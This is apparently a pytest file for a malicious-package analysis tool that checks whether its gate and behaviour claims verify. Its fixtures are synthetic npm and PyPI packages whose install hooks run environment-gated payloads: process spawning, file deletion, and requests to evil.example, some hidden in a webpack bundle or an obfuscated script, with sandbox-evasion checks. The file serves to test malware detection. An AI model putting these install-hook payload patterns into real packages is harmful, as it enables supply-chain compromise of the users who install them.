"""The candidate generator and the verifier are written independently; claims built only from candidates must
verify. A disagreement here is a bug in one of them."""
import json

import pytest

from tools.analysis import prepare, write_report
from tools.common import contract
from tools.tests.helpers import sample, tgz
from tools.verify import verify
from tools.verify.source import sample_index

BEHAVIOUR = {"network": "exfil", "exec": "spawn_process", "fs_write": "write_file", "fs_delete": "delete_file",
             "fs_read": "cred_read"}

CASES = {
    "npm-if-else": ({"package.json": json.dumps({"name": "a", "version": "1.0.0",
                                                 "scripts": {"postinstall": "node index.js"}}),
                     "index.js": "const os = require('os');\nconst cp = require('child_process');\n"
                                 "if (os.platform() === 'linux' && process.env.CI) {\n  cp.exec('id');\n} else {\n"
                                 "  require('fs').unlinkSync('/tmp/x');\n}\n"}, "package/", "npm"),
    "npm-early-exit": ({"package.json": json.dumps({"name": "b", "version": "1.0.0",
                                                   "scripts": {"preinstall": "node i.js"}}),
                       "i.js": "const os = require('os');\nif (os.hostname() === 'sandbox') return;\n"
                               "require('https').get('https://evil.example/x');\n"}, "package/", "npm"),
    "pypi-try": ({"c-1.0/setup.py": "import os\nfrom setuptools import setup\ntry:\n    open('/.dockerenv')\n"
                                    "    os.system('touch /tmp/a')\nexcept OSError:\n    os.remove('/tmp/b')\n"
                                    "setup(name='c', version='1.0')\n",
                  "c-1.0/PKG-INFO": "Name: c\nVersion: 1.0\n"}, "", "pypi"),
}


def complete_from_candidates(work):
    prep = json.loads((work / "prepared.json").read_text())
    rec = json.loads((work / "record.json").read_text())
    sinks = prep["hints"]["sinks"]
    for g in rec["gates"]:
        if g["hook"] == "resolve":
            g["then"]["behaviours"] = []
            g.update(polarity="activate", purpose="portability", purpose_reason="x")
            continue
        g.update(polarity="activate", effect="selects" if g["else"] else "enables", purpose="targeting",
                 purpose_reason="x")
        for name in ("then", "else"):
            br = g[name]
            if br is None:
                continue
            mine = [s for s in sinks if s["gate"] == g["gate_id"] and s["branch"] == name and s["kind"] in BEHAVIOUR]
            br["payload"] = [{"behaviour": BEHAVIOUR[s["kind"]], "sink_kind": s["kind"], "sink": s["anchor"],
                              "witness": []} for s in mine]
            br["behaviours"] = list(dict.fromkeys(p["behaviour"] for p in br["payload"]))
    gated = {b for g in rec["gates"] for br in (g["then"], g["else"]) if br for b in br["behaviours"]}
    rec.update(requirements=[], behaviours={"ungated": [], "gated": sorted(gated)},
               obfuscation={**rec["obfuscation"], "level": "none"},
               reachability={"needs_remote": False, "endpoints": [{**e, "role": "exfil_sink"}
                                                                  for e in rec["reachability"]["endpoints"]]},
               attack_type="unknown", family_hint=None, claude_assessment="malicious", assessment_reason="x",
               confidence="high")
    rec["package"]["model_name"] = "claude-test"
    (work / "record.json").write_text(json.dumps(rec))
    (work / "summary.md").write_text("## Summary\n\nx\n\n## Notes\n\nx\n")


@pytest.mark.parametrize("case", sorted(CASES))
def test_candidate_claims_verify(repo, case):
    files, prefix, eco = CASES[case]
    archive = f"{eco}/{case}.tgz" if eco == "npm" else f"pypi/{case}.tar.gz"
    res = prepare.prepare(sample(repo, archive, tgz(files, prefix=prefix)), None, None)
    work = repo / "scratch" / res["key"]
    complete_from_candidates(work)
    rec = contract.read_record(write_report.finish(work))
    assert rec["candidate_check"]["out_of_set_ids"] == []
    verdicts = {v["claim_id"]: v for v in verify.verdicts_for(rec, sample_index())}
    wrong = {k: (v["verdict"], v["reason_code"], v["evidence"]) for k, v in verdicts.items()
             if v["verdict"] != "verified" and not k.endswith(".excl")}
    assert not wrong, wrong


WEBPACK = """var __webpack_modules__ = ({
  "./node_modules/chalk/index.js": ((module) => { if (process.env.CI) { require("fs").writeFileSync("/tmp/c", "x"); } }),
  "./src/steal.js": ((module) => { require("https").get("https://evil.example/x"); }),
  "./src/other.js": ((module) => { module.exports = 1; }),
});
function __webpack_require__(id) { return __webpack_modules__[id](); }
if (require("os").platform() === "win32") {
  __webpack_require__("./src/steal.js");
}
"""


def test_bundle_units_are_followed_and_library_gates_left_out(repo):
    from tools.tests.helpers import cite
    files = {"package.json": json.dumps({"name": "bundled", "version": "1.0.0",
                                         "scripts": {"postinstall": "node dist/index.js"}}),
             "dist/index.js": WEBPACK}
    res = prepare.prepare(sample(repo, "npm/bundled.tgz", tgz(files)), None, None)
    work = repo / "scratch" / res["key"]
    prep = json.loads((work / "prepared.json").read_text())
    assert any(u["role"] == "library" for u in prep["units"])
    assert "units" not in prep["record"]["normalisation"]
    (summary,) = prep["record"]["normalisation"]["units_summary"]
    assert summary["by_role"]["library"] == 1 and summary["entry"] == "./src/steal.js"
    rec = json.loads((work / "record.json").read_text())
    assert [c["category"] for c in rec["conditions"]] == ["os"]  # chalk's CI check stays out of the record
    (g,) = rec["gates"]
    complete_from_candidates(work)
    rec = json.loads((work / "record.json").read_text())
    (p,) = rec["gates"][0]["then"]["payload"]
    p["witness"] = [{"hop": "call", "anchor": cite(work, "dist/index.js", 8, '__webpack_require__("./src/steal.js")')},
                    {"hop": "unit", "anchor": cite(work, "dist/index.js", 3, "(module) =>",
                                                   node_type="arrow_function")}]
    (work / "record.json").write_text(json.dumps(rec))
    out = contract.read_record(write_report.finish(work))
    verdicts = {v["claim_id"]: v for v in verify.verdicts_for(out, sample_index())}
    assert verdicts["g1.then.L3"]["verdict"] == "verified", verdicts["g1.then.L3"]
    assert verdicts["g1.then.L5"]["verdict"] == "verified"


@pytest.mark.parametrize("variant", ["none", "rc4"])
def test_obfuscated_install_script_is_recovered_and_verifies(repo, variant):
    from tools.tests.obfio import obfuscate
    script = obfuscate({"os": "os", "p": "platform", "w": "win32", "h": "https", "u": "https://evil.example/x"},
                       "const os=require({os});\nif(os[{p}]()==={w}){{require({h}).get({u});}}\n", variant=variant)
    files = {"package.json": json.dumps({"name": f"obf-{variant}", "version": "1.0.0",
                                         "scripts": {"postinstall": "node install.js"}}),
             "install.js": script}
    res = prepare.prepare(sample(repo, f"npm/obf-{variant}.tgz", tgz(files)), None, None)
    work = repo / "scratch" / res["key"]
    rec = json.loads((work / "record.json").read_text())
    (d,) = rec["normalisation"]["derivations"]
    assert d["recipe"] == "obfuscatorio_strings" and d["input"]["file"] == "install.js"
    (c,) = rec["conditions"]
    assert (c["category"], c["value"]) == ("os", "win32") and c["sites"][0]["anchor"]["derived_from"] == d["id"]
    complete_from_candidates(work)
    out = contract.read_record(write_report.finish(work))
    verdicts = {v["claim_id"]: v for v in verify.verdicts_for(out, sample_index())}
    wrong = {k: v["evidence"] for k, v in verdicts.items() if v["verdict"] != "verified" and not k.endswith(".excl")}
    assert not wrong, wrong
